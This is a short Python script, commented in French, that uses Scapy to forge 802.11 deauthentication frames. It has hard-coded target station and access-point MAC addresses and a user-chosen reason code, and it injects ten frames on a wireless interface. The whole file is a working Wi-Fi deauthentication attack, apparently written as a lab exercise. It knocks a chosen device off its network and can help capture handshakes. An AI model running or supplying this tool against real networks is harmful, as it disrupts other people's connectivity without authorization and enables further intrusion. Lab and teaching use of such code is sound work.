from scapy.all import *
import sys

# Adresse MAC de la station cible
target_mac = "00:0C:29:15:B5:C3"
# target_mac = input("Indiquez l'adresse MAC de la cible :")

# Adresse MAC du point d'accès
ap_mac = "C8:21:58:91:55:2D"
# ap_mac = input("Indiquez l'adresse MAC du point d'accès: ")

# Interface réseau
interface="wlan0"
# interface = input("Indiquez le nom de l'interface: ")


print("- Veuillez choisir la raison -")
print("1 - Unspecified")
print("4 - Disassociated due to inactivity")
print("5 - Disassociated because AP is unable to handle all currently associated stations")
print("8 - Deauthenticated because sending STA is leaving BSS")

reason_code = int(input("Indiquez le numéro [1-4-5-8] : "))

if reason_code == 1 or reason_code == 4:
    dest = target_mac
    src = ap_mac
elif reason_code == 5 or reason_code == 8:
    dest = ap_mac
    src = target_mac
else:
    print("Le code n'existe pas")
    sys.exit()

print(reason_code)
# Créer une trame de désauthentification
pkt = RadioTap() / Dot11(addr1=dest, addr2=src, addr3=ap_mac) / Dot11Deauth(reason=reason_code)

# Envoyer la trame
sendp(pkt, iface=interface, count=10, inter=0.1)
